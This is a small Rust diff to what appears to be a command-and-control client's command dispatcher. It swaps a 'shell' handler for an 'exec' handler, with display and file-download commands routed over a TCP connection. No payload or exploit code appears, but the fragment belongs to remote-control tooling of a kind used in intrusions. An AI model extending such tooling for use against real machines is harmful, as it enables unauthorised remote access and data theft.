@@ -22,7 +22,8 @@ pub fn dispatch_client(instruct: Vec<&str>, conn: &mut TcpStream, state: &C2Stat
         Some(&"display") => client::system::display(&instruct, conn),
 
         // Shell mode
-        Some(&"shell") => client::shell::run(conn, state),
+        Some(&"exec") => client::exec::run(conn, &instruct),
+        // Some(&"shell") => client::shell::run(conn, state),
 
         // File system
         Some(&"download") => client::filesystem::download(&instruct, conn, state),
